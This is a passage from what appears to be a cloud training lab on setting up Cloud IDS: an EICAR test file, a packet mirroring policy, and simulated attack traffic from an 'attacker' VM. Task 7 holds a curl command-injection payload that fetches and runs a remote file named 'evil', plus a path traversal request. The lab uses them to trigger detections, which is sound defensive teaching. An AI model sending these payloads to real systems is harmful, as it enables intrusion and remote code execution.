0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ● nginx.service - A high performance web server and a reverse proxy server</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Active: active (running) since Tue 2021-05-25 18:01:49 UTC; 5h 24 min ago</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Docs: man:nginx(8)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Main PID: 1347 (nginx)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Tasks: 3 (limit: 4665)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Memory: 4.5M</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; CGroup: /system.slice/nginx.service</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ├─1347 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ├─1348 nginx: worker process</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; └─1349 nginx: worker process</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; May 25 18:01:49 server systemd[1]: Starting A high performance web server and a reverse proxy server...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; May 25 18:01:49 server systemd[1]: Started A high performance web server and a reverse proxy server. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><ol start='' ><li><p><span>Change directory to the web service:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd /var/www/html/</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create a benign malware file on the web server. Run the following Linux command to create a text file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo touch eicar.file</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the following content to the newly created file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Exit the server VM shell and return to Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-6-create-a-cloud-ids-packet-mirroring-policy-2'><span>Task 6. Create a Cloud IDS packet mirroring policy</span></h4><p><span>In this task, you create a Cloud IDS packet mirroring policy. This policy determines what traffic is mirrored to the Cloud IDS. You will then attach this policy to the newly created Cloud IDS endpoint.</span></p><p><span>As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before you can proceed with this lab, the endpoint must be in an active/ready state.</span></p><p><span>1.To verify that your Cloud IDS endpoint is active, in Cloud Shell, run the following command to show the current state of the Cloud IDS endpoint:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints list --project=$PROJECT_ID | grep STATE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  STATE: READY</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Continue to run this command every few minutes until the state shows </span><em><span>READY</span></em><span>.</span></p><ol start='' ><li><p><span>Identify the Cloud IDS endpoint forwarding rule and confirm that the Cloud IDS endpoint state is </span><em><span>READY</span></em><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $FORWARDING_RULE</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  https://www.googleapis.com/compute/v1/projects/md975a7fa0a53145dp-tp/regions/us-east1/forwardingRules/ids-fr-cloud--xkkerutlagop6opm &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Create and attach the packet mirroring policy:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--collector-ilb=$FORWARDING_RULE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--mirrored-subnets=cloud-ids-useast1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create and attach the packet mirroring policy.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Verify that the packet mirroring policy is created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute packet-mirrorings list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NAME: cloud-ids-packet-mirroring</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  REGION: us-east1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NETWORK: cloud-ids</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ENABLE: TRUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h4 id='task-7-simulate-attack-traffic-2'><span>Task 7. Simulate attack traffic</span></h4><p><span>In this task, you establish an SSH connection to your attacked virtual machine and simulate attack traffic from a virtual machine to your server. You do this by running a selection of </span><code>curl</code><span> commands that range from low severity to critical severity.</span></p><ol start='' ><li><p><span>To establish an SSH connection to your attacker virtual machine through IAP, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> You are now in the shell of your attacker VM and not the Cloud Shell machine.</span></p><ol start='' ><li><p><span>Run the following </span><code>curl</code><span> requests in sequence to simulate low, medium, high, and critical severity alerts on the IDS:</span></p></li></ol><p><strong><span>Low Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Medium Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://192.168.10.20/?item=../../../../WINNT/win.ini</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 